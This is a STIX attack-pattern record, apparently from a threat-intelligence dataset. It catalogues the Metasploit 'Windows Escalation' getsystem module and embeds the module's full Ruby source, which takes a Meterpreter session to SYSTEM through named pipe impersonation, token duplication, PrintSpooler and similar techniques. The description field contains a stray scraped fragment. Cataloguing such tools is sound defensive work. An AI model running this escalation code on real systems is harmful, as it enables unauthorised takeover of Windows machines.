{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5910e8a1-86cc-411f-87e4-e92291dd8420",
    "created": "2024-08-14T16:33:04.624513Z",
    "modified": "2024-08-14T16:33:04.624517Z",
    "name": "Windows Escalation",
    "description": " This module uses the `getsystem` command to escalate the current session to the SYSTEM account using various techniques.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/escalate/getsystem.rb",
            "external_id": "getsystem.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalation',\n        'Description' => %q{\n          This module uses the `getsystem` command to escalate the current session to the SYSTEM account using various\n          techniques.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'hdm',\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              priv_elevate_getsystem\n            ]\n          }\n        },\n        'Notes' => {\n          'AKA' => [\n            'Named Pipe Impersonation',\n            'Token Duplication',\n            'RPCSS',\n            'PrintSpooler',\n            'EFSRPC',\n            'EfsPotato'\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptInt.new('TECHNIQUE', [false, 'Specify a particular technique to use (1-6), otherwise try them all', 0])\n    ])\n  end\n\n  def unsupported\n    print_error('This platform is not supported with this script!')\n    raise Rex::Script::Completed\n  end\n\n  def run\n    technique = datastore['TECHNIQUE'].to_i\n\n    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)\n\n    if is_system?\n      print_good('This session already has SYSTEM privileges')\n      return\n    end\n\n    begin\n      result = client.priv.getsystem(technique)\n      print_good(\"Obtained SYSTEM via technique #{result[1]}\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error('Failed to obtain SYSTEM access')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}